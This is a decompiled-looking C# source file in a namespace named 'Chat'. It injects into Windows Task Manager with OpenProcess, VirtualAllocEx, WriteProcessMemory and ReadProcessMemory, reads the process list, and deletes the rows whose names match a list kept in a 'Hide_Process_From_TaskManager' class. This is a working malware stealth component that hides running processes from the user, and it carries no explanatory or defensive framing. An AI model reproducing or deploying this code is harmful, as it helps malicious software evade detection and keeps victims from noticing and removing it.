namespace Chat
{
    using Microsoft.VisualBasic.CompilerServices;
    using Microsoft.Win32.SafeHandles;
    using System;
    using System.ComponentModel;
    using System.Diagnostics;
    using System.Runtime.InteropServices;
    using System.Text;
    using System.Windows.Forms;

    [StandardModule]
    internal sealed class GetItems
    {
        public const uint HDI_TEXT = 2;
        public const uint HDM_GETIEMA = 0x1203;
        public const uint HDM_GETITEMCOUNT = 0x1200;
        public const uint HDM_GETITEMW = 0x120b;
        public const uint HDM_GETUNICODEFORMAT = 0x2006;
        public const string kernel32 = "kernel32";
        private static IntPtr listViewHandle;
        public const uint LVM_DELETEITEM = 0x1008;
        public const uint LVM_FIRST = 0x1000;
        public const uint LVM_GETHEADER = 0x101f;
        public const uint LVM_GETITEMCOUNT = 0x1004;
        public const uint LVM_GETITEMTEXT = 0x102d;
        public const uint MEM_COMMIT = 0x1000;
        public const uint MEM_RELEASE = 0x8000;
        public const uint PAGE_READWRITE = 4;
        public const uint PROCESS_VM_OPERATION = 8;
        public const uint PROCESS_VM_READ = 0x10;
        public const uint PROCESS_VM_WRITE = 0x20;
        public const string user32 = "user32";
        public const uint WM_GETTEXT = 13;
        public const uint WM_GETTEXTLENGTH = 14;

        [DllImport("user32", EntryPoint="SendMessageA", SetLastError=true)]
        private static extern IntPtr GetHeaderSendMessage(IntPtr hWnd, uint message, IntPtr wParam, IntPtr lParam);
        public static string GetItem(int row, int subitem, SafeProcessHandle hProcess)
        {
            IntPtr ptr;
            LV_ITEM lpBuffer = new LV_ITEM();
            lpBuffer.cchTextMax = 260;
            lpBuffer.mask = 1;
            lpBuffer.iItem = row;
            lpBuffer.iSubItem = subitem;
            StringBuilder builder = new StringBuilder(260);
            try
            {
                IntPtr ptr2;
                ptr = VirtualAllocEx(hProcess, IntPtr.Zero, 260, 0x1000, 4);
                lpBuffer.pszText = ptr;
                try
                {
                    ptr2 = VirtualAllocEx(hProcess, IntPtr.Zero, lpBuffer.Size(), 0x1000, 4);
                    int lpNumberOfBytesWritten = 0;
                    if (!WriteProcessMemory(hProcess, ptr2, ref lpBuffer, lpBuffer.Size(), ref lpNumberOfBytesWritten))
                    {
                        throw new Win32Exception();
                    }
                    SendMessage(listViewHandle, 0x102d, row, ptr2);
                    lpNumberOfBytesWritten = 0;
                    if (!ReadProcessMemory(hProcess, ptr, builder, 260, ref lpNumberOfBytesWritten))
                    {
                        throw new Win32Exception();
                    }
                    lpNumberOfBytesWritten = 0;
                    if (!ReadProcessMemory(hProcess, ptr2, ref lpBuffer, Marshal.SizeOf(lpBuffer), ref lpNumberOfBytesWritten))
                    {
                        throw new Win32Exception();
                    }
                }
                finally
                {
                    if (!ptr2.Equals(IntPtr.Zero) && !VirtualFreeEx(hProcess, ptr2, 0, 0x8000))
                    {
                        throw new Win32Exception();
                    }
                }
            }
            finally
            {
                if (!ptr.Equals(IntPtr.Zero) && !VirtualFreeEx(hProcess, ptr, 0, 0x8000))
                {
                    throw new Win32Exception();
                }
            }
            return builder.ToString();
        }

        public static bool GetListView(IntPtr handle, IntPtr lvhandle)
        {
            bool flag;
            listViewHandle = lvhandle;
            IntPtr ptr = handle;
            int dwProcessId = -1;
            try
            {
                foreach (Process process in Process.GetProcessesByName("taskmgr"))
                {
                    dwProcessId = process.Id;
                }
                if (dwProcessId == -1)
                {
                    throw new ArgumentException("Can't find process", "processName");
                }
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                flag = false;
                ProjectData.ClearProjectError();
                return flag;
            }
            SafeProcessHandle hProcess = null;
            try
            {
                hProcess = OpenProcess(0x38, false, dwProcessId);
                if ((hProcess == null) && (Marshal.GetLastWin32Error() == 0))
                {
                    throw new Win32Exception();
                }
                int num2 = SendMessage(listViewHandle, 0x1004, IntPtr.Zero, IntPtr.Zero);
                int num5 = num2 - 1;
                for (int i = 0; i <= num5; i++)
                {
                    ListViewItem item = new ListViewItem(GetItem(i, 0, hProcess));
                    foreach (string str in Hide_Process_From_TaskManager.Processes_Names)
                    {
                        Hide_Process_From_TaskManager.MyProc = str;
                        if (item.Text.Contains(Hide_Process_From_TaskManager.MyProc))
                        {
                            SendMessage(listViewHandle, 0x1008, i, IntPtr.Zero);
                        }
                    }
                }
            }
            catch (Exception exception2)
            {
                ProjectData.SetProjectError(exception2);
                flag = false;
                ProjectData.ClearProjectError();
                return flag;
                ProjectData.ClearProjectError();
            }
            finally
            {
                if (hProcess != null)
                {
                    hProcess.Close();
                    hProcess.Dispose();
                }
            }
            return true;
        }

        [DllImport("kernel32", SetLastError=true)]
        private static extern SafeProcessHandle OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
        [return: MarshalAs(UnmanagedType.Bool)]
        [DllImport("kernel32", SetLastError=true)]
        private static extern bool ReadProcessMemory(SafeProcessHandle hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, int nSize, ref int bytesRead);
        [return: MarshalAs(UnmanagedType.Bool)]
        [DllImport("kernel32", CharSet=CharSet.Ansi, SetLastError=true)]
        private static extern bool ReadProcessMemory(SafeProcessHandle hProcess, IntPtr lpBaseAddress, StringBuilder lpBuffer, int nSize, ref int bytesRead);
        [return: MarshalAs(UnmanagedType.Bool)]
        [DllImport("kernel32", SetLastError=true)]
        private static extern bool ReadProcessMemory(SafeProcessHandle hProcess, IntPtr lpBaseAddress, ref HDITEM lpBuffer, int nSize, ref int bytesRead);
        [return: MarshalAs(UnmanagedType.Bool)]
        [DllImport("kernel32", SetLastError=true)]
        private static extern bool ReadProcessMemory(SafeProcessHandle hProcess, IntPtr lpBaseAddress, ref LV_ITEM lpBuffer, int nSize, ref int bytesRead);
        [return: MarshalAs(UnmanagedType.Bool)]
        [DllImport("kernel32", EntryPoint="ReadProcessMemory", CharSet=CharSet.Unicode, SetLastError=true)]
        private static extern bool ReadProcessMemoryW(SafeProcessHandle hProcess, IntPtr lpBaseAddress, StringBuilder lpBuffer, int nSize, ref int bytesRead);
        [DllImport("user32", SetLastError=true)]
        private static extern int SendMessage(IntPtr hWnd, uint message, int wParam, IntPtr lParam);
        [DllImport("user32", SetLastError=true)]
        private static extern int SendMessage(IntPtr hWnd, uint message, int wParam, StringBuilder lParam);
        [DllImport("user32", SetLastError=true)]
        private static extern int SendMessage(IntPtr hWnd, uint message, IntPtr wParam, IntPtr lParam);
        [DllImport("kernel32", SetLastError=true)]
        private static extern IntPtr VirtualAllocEx(SafeProcessHandle hProcess, IntPtr lpAddress, int dwSize, uint flAllocationType, uint flProtect);
        [return: MarshalAs(UnmanagedType.Bool)]
        [DllImport("kernel32", SetLastError=true)]
        private static extern bool VirtualFreeEx(SafeProcessHandle hProcess, IntPtr lpAddress, int dwSize, uint dwFreeType);
        [return: MarshalAs(UnmanagedType.Bool)]
        [DllImport("kernel32", SetLastError=true)]
        private static extern bool WriteProcessMemory(SafeProcessHandle hProcess, IntPtr lpBaseAddress, ref HDITEM lpBuffer, int nSize, ref int lpNumberOfBytesWritten);
        [return: MarshalAs(UnmanagedType.Bool)]
        [DllImport("kernel32", SetLastError=true)]
        private static extern bool WriteProcessMemory(SafeProcessHandle hProcess, IntPtr lpBaseAddress, ref LV_ITEM lpBuffer, int nSize, ref int lpNumberOfBytesWritten);

        [StructLayout(LayoutKind.Sequential)]
        public struct HDITEM
        {
            public uint mask;
            public int cxy;
            public IntPtr pszText;
            public IntPtr hbm;
            public int cchTextMax;
            public int fmt;
            public IntPtr lParam;
            public int iImage;
            public int iOrder;
            public int Size()
            {
                return Marshal.SizeOf(this);
            }
        }

        [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
        public struct LV_ITEM
        {
            public uint mask;
            public int iItem;
            public int iSubItem;
            public uint state;
            public uint stateMask;
            public IntPtr pszText;
            public int cchTextMax;
            public int iImage;
            public IntPtr lParam;
            public int iIndent;
            public int iGroupId;
            public int cColumns;
            public IntPtr puColumns;
            public IntPtr piColFmt;
            public int iGroup;
            public int Size()
            {
                return Marshal.SizeOf(this);
            }
        }

        internal sealed class SafeProcessHandle : SafeHandleZeroOrMinusOneIsInvalid
        {
            public SafeProcessHandle() : base(true)
            {
            }

            public SafeProcessHandle(IntPtr handle) : base(true)
            {
                base.SetHandle(handle);
            }

            [DllImport("kernel32.dll", CharSet=CharSet.Auto, SetLastError=true)]
            public static extern bool CloseHandle(IntPtr hObject);
            protected override bool ReleaseHandle()
            {
                return CloseHandle(base.handle);
            }
        }
    }
}

